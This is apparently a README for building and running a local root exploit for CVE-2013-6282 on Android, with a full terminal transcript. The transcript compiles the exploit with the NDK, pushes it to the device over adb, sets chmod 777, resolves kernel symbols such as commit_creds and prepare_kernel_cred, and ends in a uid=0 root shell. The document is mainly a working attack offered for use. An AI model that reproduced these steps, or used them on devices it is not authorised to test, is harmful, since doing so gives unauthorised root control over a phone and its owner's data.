
BUILDING:

Download the android ndk, e.g:
https://dl.google.com/android/repository/android-ndk-r10e-linux-x86_64.zip
(I used android-ndk-10d)

Unzip it and install ensure ndk-build is in your PATH

```
$ make root
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-16 APP_ABI=armeabi
make[1]: Entering directory '/home/user/dev/git/exploits/CVE-2013-6282'
[armeabi] Compile thumb  : exploit <= exploit.c
[armeabi] Executable     : exploit
[armeabi] Install        : exploit => libs/armeabi/exploit
make[1]: Leaving directory '/home/user/dev/git/exploits/CVE-2013-6282'
adb push libs/armeabi/exploit /data/local/tmp/exploit
[100%] /data/local/tmp/exploit
adb shell 'chmod 777 /data/local/tmp/exploit'
adb shell '/data/local/tmp/exploit'
search kallsyms...
kallsyms_addresses=c0868160
kallsyms_num_syms=0000b3fc
dumping kernel...

prepare_kernel_cred=c033af9c
commit_creds=c033a7e8
ptmx_fops=c0aed088
ptmx_open=c04d037c
tty_init_dev=c04c9144
tty_release=c04c8b98
tty_fasync=c04c6278
ptm_driver=00000000

No shellcode, uid=0
root@android:/ # id
id
uid=0(root) gid=0(root)
root@android:/ # 
```

credits:
https://github.com/fi01/libput_user_exploit
https://twitter.com/cubeundcube

